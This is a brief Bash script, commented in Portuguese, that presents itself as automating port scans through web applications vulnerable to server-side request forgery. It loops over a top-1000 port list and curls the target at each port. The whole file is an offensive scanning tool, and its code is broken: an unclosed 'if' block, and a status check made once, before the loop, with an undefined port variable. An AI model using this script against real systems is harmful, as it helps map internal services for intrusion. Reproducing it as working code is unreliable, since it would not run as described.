#!/bin/bash

##########################################################################
#
# Nome: SSRFPortScan.sh
#
# Data: 08/02/2022
#
# Descrição: Automatiza o Port Scan em aplicações vulneráveis a SSRF
#
# Uso: ./SSRFPortScan.sh [URL]
#
##########################################################################

PORTS=$(cat ports_top1000.txt)
TARGET="$1"
CODE=$(curl -s -I "$TARGET:$PORT" | head -1 | cut -d " " -f2)

if [ -z $1 ]
then
    echo "Passe a URL alvo como parametro"
    echo "Modo de uso: ./SSRFPortScan.sh [URL]"
    exit 1

for PORT in $PORTS
do
    if [ $CODE -eq 404 ]
    then
        continue
    else
        CONTENT=$(curl -s $TARGET:$PORT | head)
        echo "Testando porta: $PORT"
        echo "Code: $CODE"
        echo "Conteúdo: $CONTENT"
        echo
    fi
done
